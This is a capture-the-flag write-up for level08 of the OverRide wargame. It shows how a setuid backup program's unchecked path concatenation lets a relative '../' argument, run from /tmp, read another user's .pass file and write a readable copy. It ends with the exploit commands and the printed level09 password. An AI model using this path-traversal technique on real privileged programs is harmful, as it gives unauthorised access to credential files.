In the source code, we can see 4 things:
1. First of all, a log file in write only is open: `FILE *log = fopen("./backups/.log", "w");`
2. Then, a file in read only is open from the data user input: `FILE *read_file = fopen(argv[1], "r");`
3. We open a file in write mode which is a concatenation of `./backups` and `argv[1]`
4. For each char in the read_file, write it into the write one.

To exploit this, we need to have a way were the `read_file` is equal to `/home/users/level09/.pass`,
and the writing one is a file that we can read.

To do so, if we are in the `/tmp` directory, and we replicate the directory structure of `levle09` users, such as:
`mkdir -p /tmp/home/users/level09/`

And we create a `backups/.log` file in `tmp`:
`mkdir /tmp/backups && touch /tmp/backups/.log`

We can specify from the `/tmp` directory the following path:
`../home/users/level09/.pass`

If we resolve it with the point of view of the `fopen` for read file, we'll open:
`/tmp/../home/users/level09/.pass` (so the good file).

And if we check with the write file:
```c
char path[64];
strcpy(path, "./backups/");
// /tmp/backups/../home/users/level09/.pass
// <=> /tmp/home/users/level09/.pass
strncat(path, argv[1], 100 - strlen(path));

int fd = open(path, 193, 432)
```

With that, we control the write directory, and we can properly read the level09 flag.

```sh
level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
level08@OverRide:/tmp$ cat ./home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```